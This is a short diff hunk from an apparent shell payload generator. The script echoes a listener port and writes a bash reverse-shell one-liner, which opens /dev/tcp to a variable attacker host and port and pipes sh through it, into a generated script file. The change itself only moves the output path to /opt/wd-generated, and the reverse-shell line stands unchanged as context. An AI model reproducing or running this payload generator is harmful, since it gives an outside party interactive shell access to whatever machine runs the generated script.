@@ -8,4 +8,4 @@ echo "LPORT : $LPORT"
 echo """
 #!/bin/bash
 0<&196;exec 196<>/dev/tcp/$LHOST/$LPORT; sh <&196 >&196 2>&196
-""" >> ../wd-generated/bashshell.sh
+""" >> /opt/wd-generated/bashshell.sh
